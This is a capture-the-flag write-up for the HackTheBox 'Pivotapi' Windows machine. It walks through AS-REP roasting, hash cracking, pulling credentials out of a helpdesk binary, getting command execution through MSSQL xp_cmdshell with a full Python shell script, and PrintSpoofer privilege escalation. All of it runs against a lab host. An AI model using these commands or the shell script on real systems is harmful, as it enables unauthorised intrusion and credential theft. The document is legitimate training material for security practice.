# Pivotapi
#windows #CTF #HTB

Level : Insane
IP: 10.10.10.240
OS : Windows 

## Setup

Lets start by adding the IP to our hosts file
```bash
echo "10.10.10.240 pivotapi.htb" >> /etc/hosts
```

## Recon 
Lets start with look at what ports are open. 

### nmap

```bash
nmap -sV -sC -Pn -o scan pivotapi.htb
```

```output
Nmap scan report for pivotapi.htb (10.10.10.240)  
Host is up (0.030s latency).  
Not shown: 986 filtered ports  
PORT     STATE SERVICE       VERSION  
21/tcp   open  ftp           Microsoft ftpd  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf  
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf  
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf  
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf  
| 08-08-20  01:18PM               219091 notes1.pdf  
| 08-08-20  01:34PM               279445 notes2.pdf  
| 08-08-20  01:41PM                  105 README.txt  
|\_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf  
| ftp-syst:    
|\_  SYST: Windows\_NT  
22/tcp   open  ssh           OpenSSH for\_Windows\_7.7 (protocol 2.0)  
| ssh-hostkey:    
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)  
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)  
|\_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-18 06:34:08Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ms-sql-ntlm-info:    
|   Target\_Name: LICORDEBELLOTA  
|   NetBIOS\_Domain\_Name: LICORDEBELLOTA  
|   NetBIOS\_Computer\_Name: PIVOTAPI  
|   DNS\_Domain\_Name: LicorDeBellota.htb  
|   DNS\_Computer\_Name: PivotAPI.LicorDeBellota.htb  
|   DNS\_Tree\_Name: LicorDeBellota.htb  
|\_  Product\_Version: 10.0.17763  
| ssl-cert: Subject: commonName=SSL\_Self\_Signed\_Fallback  
| Not valid before: 2021-05-18T06:31:34  
|\_Not valid after:  2051-05-18T06:31:34  
|\_ssl-date: 2021-05-18T06:34:50+00:00; +15s from scanner time.  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|\_clock-skew: mean: 14s, deviation: 0s, median: 14s  
| ms-sql-info:    
|   10.10.10.240:1433:    
|     Version:    
|       name: Microsoft SQL Server 2019 RTM  
|       number: 15.00.2000.00  
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM  
|       Post-SP patches applied: false  
|\_    TCP port: 1433  
| smb2-security-mode:    
|   2.02:    
|\_    Message signing enabled and required  
| smb2-time:    
|   date: 2021-05-18T06:34:13  
|\_  start\_date: N/A
```

We can see there a FTP server open which accept anonymous login. 

### FTP

```bash
ftp -pi pivotapi.htb  
Connected to pivotapi.htb.  
220 Microsoft FTP Service  
Name (pivotapi.htb:avhn): anonymous  
331 Anonymous access allowed, send identity (e-mail name) as password.  
Password:  
230 User logged in.  
Remote system type is Windows\_NT.  
ftp>
```

download the README.txt file, it tells us we need to be in binary mode to download the file otherwise they get corrupted. download the rest of the files 

```bash
ftp> mget *
```

Reading the files get me nothing, lets see if there any valuable metadata in the files we can use. 
We see the metadata contains usernames, use exiftool to extract metadata from the files and add the usernames to a text file 

```bash
exiftool * | egrep "Author|Creator" | awk'{print $3}' > users.txt
```

Lets see if anyone of the user have pre-authentication enabled.

I will be using the impacket git for doing the check.
https://github.com/SecureAuthCorp/impacket

````bash
GetNPUsers.py -dc-ip Pivotapi.htb -no-pass -usersfile user.txt LicorDeBellota/ 
````

```bash
 
Impacket v0.9.23.dev1+20210517.123049.a0612f00 - Copyright 2020 SecureAuth Corporation  
  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
$krb5asrep$23$Kaorz@LICORDEBELLOTA:7126c1220251bd31031486030a7cb79b$7041acc8c8068fd6a48572495e3e9b66ac6221e91a199e2be1d5ded228008322e1dfb3f6150fd99c91a90f58b5e51bd1d91832683294de4529203321951fe3412033f22e480a4e70e3a11e6972bb9c394ca0d8a  
c9d0bb252ae1cff026954ae1dafcaa833f1239890f06f3432e2e356255123a2d0f1dcd40741b0d18f7a59070444be8a1f53c90b957a5de2fe26da781c5bffb3595b7dd6a1473b11fdd5fa8fa926a2cccd2972b4afe243f7b7e791132bfe19bb7b2d462133c29bcbe83e34ebbc10243624f5f102ebf0  
818dfe14a4a55585521cb37ca833dfbbc6d737ce1785b09bcf51d0c5bf7e29fd4bd71e6c895c243f4b86a9  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)  
\[-\] Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN(Client not found in Kerberos database)
```

As you can see one of the account have pre-authentication enabled *Kaorz*

```hash
$krb5asrep$23$Kaorz@LICORDEBELLOTA:7126c1220251bd31031486030a7cb79b$7041acc8c8068fd6a48572495e3e9b66ac6221e91a199e2be1d5ded228008322e1dfb3f6150fd99c91a90f58b5e51bd1d91832683294de4529203321951fe3412033f22e480a4e70e3a11e6972bb9c394ca0d8ac9d0bb252ae1cff026954ae1dafcaa833f1239890f06f3432e2e356255123a2d0f1dcd40741b0d18f7a59070444be8a1f53c90b957a5de2fe26da781c5bffb3595b7dd6a1473b11fdd5fa8fa926a2cccd2972b4afe243f7b7e791132bfe19bb7b2d462133c29bcbe83e34ebbc10243624f5f102ebf0818dfe14a4a55585521cb37ca833dfbbc6d737ce1785b09bcf51d0c5bf7e29fd4bd71e6c895c243f4b86a9
```

Using *John* to crack the hash of the user. 

```bash
Koarz.hsh -w=/usr/share/wordlists/rockyou.txt 
```
```bash
Using default input encoding: UTF-8  
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 \[MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x\])  
Will run 8 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Roper4155        ($krb5asrep$23$Kaorz@LICORDEBELLOTA)  
1g 0:00:00:07 DONE (2021-05-18 09:50) 0.1371g/s 1463Kp/s 1463Kc/s 1463KC/s Roybel01..Ronald8  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed
```

We got our first user Kaorz : Roper4155

Get along of *CrackMapExec*
https://github.com/byt3bl33d3r/CrackMapExec

### SMB

We will now login into smb and see what we have access too. 

```bash
crackmapexec smb pivotapi.htb -u Kaorz -p Roper4155 --shares
```

```bash
SMB 10.10.10.240    445    PIVOTAPI \[\*\] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
SMB 10.10.10.240    445    PIVOTAPI \[+\] LicorDeBellota.htb\\Kaorz:Roper4155   
SMB 10.10.10.240    445    PIVOTAPI \[+\] Enumerated shares  
SMB 10.10.10.240    445    PIVOTAPI Share           Permissions     Remark  
SMB 10.10.10.240    445    PIVOTAPI \-----           -----------     ------  
SMB 10.10.10.240    445    PIVOTAPI ADMIN$                          Admin remota  
SMB 10.10.10.240    445    PIVOTAPI C$                              Recurso predeterminado  
SMB 10.10.10.240    445    PIVOTAPI IPC$            READ            IPC remota  
SMB 10.10.10.240    445    PIVOTAPI NETLOGON        READ            Recurso compartido del servidor de inicio de sesión   
SMB 10.10.10.240    445    PIVOTAPI SYSVOL          READ            Recurso compartido del servidor de inicio de sesión
```

We have access to three directory, let use *smbclient* to access the shares and see if we can find anything of interesting. 
#smbclient
```bash
smbclient //pivotapi.htb/SYSVOL -U kaorz%Roper4155
```


Looking under *DfsrPrivate\\scripts\\HelpDesk* we find some interresting files.
Two  emial messages files and exe files to restart the Oracle server. 

Server msql.msg
```bash
Good afternoon,  
  
Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020.  
Remember that there were problems at the time of restarting the Oracle service and for this reason a program called "Reset-Service.exe" was created to log in to Oracle and restart the service.  
  
Any doubt do not hesitate to contact us.  
  
Greetings,  
  
The HelpDesk Team
```

So they migrated from Oracle to MSSQL and they used the Reset-service to log in to Oracle and restart the service. So we know that is have creds for the old Oracle server, we can hope they re-used  the cred for SQL

WinRM Service.msg
```
Good afternoon.  
   
After the last pentest, we have decided to stop externally displaying WinRM's service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of  
the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.)  
Greetings,  
   
The HelpDesk Team
```

After a pentest they have block all WinRM services. 

Start up your windows VM and transfer Restart-OracleService.exe for further analysis. 

Execute the *Restart-OracleService* and watch sysmon to see what it does. 
![[Pasted image 20210518115600.png]]

We can see it create a random bat files which get executed and deleted afterwards. 
So we need to capture what commands it tries to run. I will be using *CMD Watcher* for that. 
https://www.kahusecurity.com/tools.html

Start in interative mode, start *Restart-OracleService* and stop it before it deletes the bat file.

![[Pasted image 20210518124146.png]]

Kill *Restart-OracleService*  lets take a look at the bat file. 

![[Pasted image 20210518125507.png]]

The bat script looks to be encoded it takes the encoded data and put it into oracle.txt, which then get loop through by monta.ps1 and writes the bytes to restart-service.exe. it then exeucte *restart-service* and delete everything. So we need to modify the scripts. Remove the if statements and create a *goto correcto*

![[Pasted image 20210518130444.png]]

At the end removes the del statements  
![[Pasted image 20210518130517.png]]

Run the bat file. *restart-service* should now be located in *C:/programData/*
We need to monitor what the executable does, We will do that by using a tool called *API  monitor*
http://www.rohitab.com/apimonitor

Fire up *API monitor* so we can analyze it. 
Check off all API filters and set monitored process to *restart-service*

![[Pasted image 20210518131922.png]]

We can now see what API calls it does. 
press *Ctrol-F* to open Find and search for password

```bash
#	Time of Day	Thread	Module	API	Return Value	Error	Duration
CreateProcessWithLogonW ( "svc_oracle", "", "#oracle_s3rV1c3!2010", 0, NULL, ""c:\windows\system32\cmd.exe" /c sc.exe stop OracleServiceXE; sc.exe start OracleServiceXE", 0, NULL, "C:\ProgramData", 0x000000000234e120, 0x0000000003f61c68 )  FALSE   1326 = The user name or password is incorrect.
```

We now have username and password for the Orcale server. 
svc_oracle : \#oracle_s3rV1c3!2010

From the Nmap result we know there a MSSQL server port open, lets try and connect it to with the knowledge we have of how the oracle was setup. 

Lets connect to the sql server, I do know think they reused the same password, but maybe something in a similar type *svc_mssql: \#mssql_s3rV1c3!2020* because they migrated in 2020
let try do a quick try.

```bash
mssqlclient.py -port 1433 svc_mssql@pivotapi.htb  

Impacket v0.9.23.dev1+20210517.123049.a0612f00 - Copyright 2020 SecureAuth Corporation  
  
Password:  
\[\*\] Encryption required, switching to TLS  
\[-\] ERROR(PIVOTAPI\\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'svc\_mssql'.
```

wrong password, lets with the mssql default account *sa* and the same password.

```bash
mssqlclient.py -port 1433 sa@pivotapi.htb  
Impacket v0.9.23.dev1+20210517.123049.a0612f00 - Copyright 2020 SecureAuth Corporation  
  
Password:  
\[\*\] Encryption required, switching to TLS  
\[\*\] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
\[\*\] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español  
\[\*\] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
\[\*\] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.  
\[\*\] INFO(PIVOTAPI\\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.  
\[\*\] ACK: Result: 1 - Microsoft SQL Server (150 7208)    
\[!\] Press help for extra shell commands  
SQL>
```

And we got access to the server. 
We can run cmd command on the machine by invoking the command *xp-cmdshell* 

## Privileged escalation

```cmd
xp_cmdshell whoami /priv
nt service\\mssql$sqlexpress

SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso Deshabilitado   
  
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado      
  
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio          Deshabilitado      
  
SeChangeNotifyPrivilege       Omitir comprobación de recorrido                  Habilitada         
  
SeManageVolumePrivilege       Realizar tareas de mantenimiento del volumen      Habilitada         
  
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada         
  
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada         
  
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
```

lets put it into translate to better understand what it say

```
SeAssignPrimaryTokenPrivilege Replace a process-level token Disabled
  
SeIncreaseQuotaPrivilege Adjust memory quotas for a Disabled process
  
SeMachineAccountPrivilege Add workstations to domain Disabled
  
SeChangeNotifyPrivilege Skip Traversal Check Enabled
  
SeManageVolumePrivilege Perform volume maintenance tasks Enabled
  
SeImpersonatePrivilege Impersonate a client after authentication Enabled
  
SeCreateGlobalPrivilege Create global objects Enabled
  
SeIncreaseWorkingSetPrivilege Increase the workspace of a Disabled process
```

Look at *SeImpersonatePrivilege* it allows us to impersonate another client. 
Printspoofer allows us to 
A quick google search  for mssql shell lead me to this page. 
https://alamot.github.io/mssql_shell/

create a python script with the code from the site and edit the configuration to look like this 

```python
MSSQL\_SERVER="10.10.10.240"  
MSSQL\_USERNAME = "sa"  
MSSQL\_PASSWORD = "#mssql\_s3rV1c3!2020"
```

We now have a better shell on the box, with some more options. 

google SeImpersonatePrivilege privilege-escalation
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
I have not set up my development env, i need to look for allready build version. 
I found a build version of printspoofer
https://github.com/dievus/printspoofer

There is a problem with the mssql_shell when it comes to upload files if you have python3 3.9+ 
where base64 has which from *encodestring* to *encodebytes*. I have modified the script to handle both environments 

mssql_shell.py
```python
#!/usr/bin/env python
from __future__ import print_function
# Author: Alamot
# Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)
# To upload a file, type: UPLOAD local_path remote_path
# e.g. UPLOAD myfile.txt C:\temp\myfile.txt
# If you omit the remote_path it uploads the file on the current working folder.
# Be aware that pymssql has some serious memory leak issues when the connection fails (see: https://github.com/pymssql/pymssql/issues/512).
import _mssql

try:
	from base64 import encodebytes
except ImportError:
	from base64 import encodestring as encodebytes

import shlex
import sys
import tqdm
import hashlib
from io import open
try: input = raw_input
except NameError: pass


MSSQL_SERVER="10.10.10.240"
MSSQL_USERNAME = "sa"
MSSQL_PASSWORD = "#mssql_s3rV1c3!2020"
BUFFER_SIZE = 5*1024
TIMEOUT = 30


def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""
    rows = list(mssql)
    for row in rows[:-3]:
        columns = list(row)
        if row[columns[-1]]:
            print(row[columns[-1]])
        else:
            print()
    if len(rows) >= 3:
        (username, computername) = rows[-3][list(rows[-3])[-1]].split('|')
        cwd = rows[-2][list(rows[-3])[-1]]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())


def upload(mssql, stored_cwd, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = b"".join(encodebytes(data).split()).decode()
        
    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        #print("Remaining: "+str(len(b64enc_data)-i))

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(mssql)
    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[list(row)[-1]].strip() for row in mssql if row[list(row)[-1]]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")


def shell():
    mssql = None
    stored_cwd = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")

        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(mssql)
        stored_cwd = cwd
        
        while True:
            cmd = input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if not cmd:
                cmd = "call" # Dummy cmd command
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return
            elif cmd[0:6] == "UPLOAD":
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) < 3:
                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
                else:
                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(mssql)
            stored_cwd = cwd
            
    except _mssql.MssqlDatabaseException as e:
        if  e.severity <= 16:
            print("MSSQL failed: "+str(e))
        else:
            raise
    finally:
        if mssql:
            mssql.close()


shell()
sys.exit()
```

This should fix the problem with the UPLOAD command

Upload PrintSpoofer to the server and get the flags
```bash
UPLOAD PrintSpoofer.exe C:\temp\PrintSpoofer.exe
cd C:\temp
printspoofer.exe -i -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"

printspoofer.exe -i -c "powershell -c type C:\Users\cybervaca\Desktop\root.txt"
```
And we got user and root. 

### Writeups 
code --> 81b32769d55ca9fc807a86b24709a7f9
https://0xdedinfosec.github.io/posts/htb-pivotapi/ 